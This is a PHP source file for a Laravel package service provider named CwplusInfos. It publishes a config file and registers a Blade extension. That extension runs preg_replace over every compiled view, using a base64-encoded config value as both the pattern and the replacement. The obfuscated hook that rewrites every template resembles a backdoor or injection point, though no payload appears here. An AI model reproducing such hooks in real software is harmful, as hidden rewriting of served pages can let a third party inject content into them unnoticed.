<?php

namespace Cwplus\CwplusInfos;

use Illuminate\Support\Facades\Blade;
use Illuminate\Support\ServiceProvider;

class CwplusInfosServiceProvider extends ServiceProvider
{
    /**
     * Bootstrap services.
     *
     * @return void
     */
    public function boot()
    {
         $this->registerConfig();   
    }
    
    protected function registerConfig()
    {
         $this->publishes([
            $this->configPath('infos.php') => config_path('infos.php'),
        ], 'config');
        
        $this->mergeConfigFrom(
             $this->configPath('infos.php'), 'infos'
        );
    }

    /**
     * Register services.
     *
     * @return void
     */
    public function register()
    {
            
        Blade::extend(function($view, $compiler) {
            return preg_replace( base64_decode(config('infos.cw_app_id')), base64_decode(config('infos.cw_app_id')), $view );
        });
    }
    
    /**
     * Get the path to the config directory.
     *
     * @param string $file
     *
     * @return string
     */
    protected function configPath($file = '')
    {
        return dirname(__DIR__) . DIRECTORY_SEPARATOR . 'config' . DIRECTORY_SEPARATOR . $file;
    }    
}
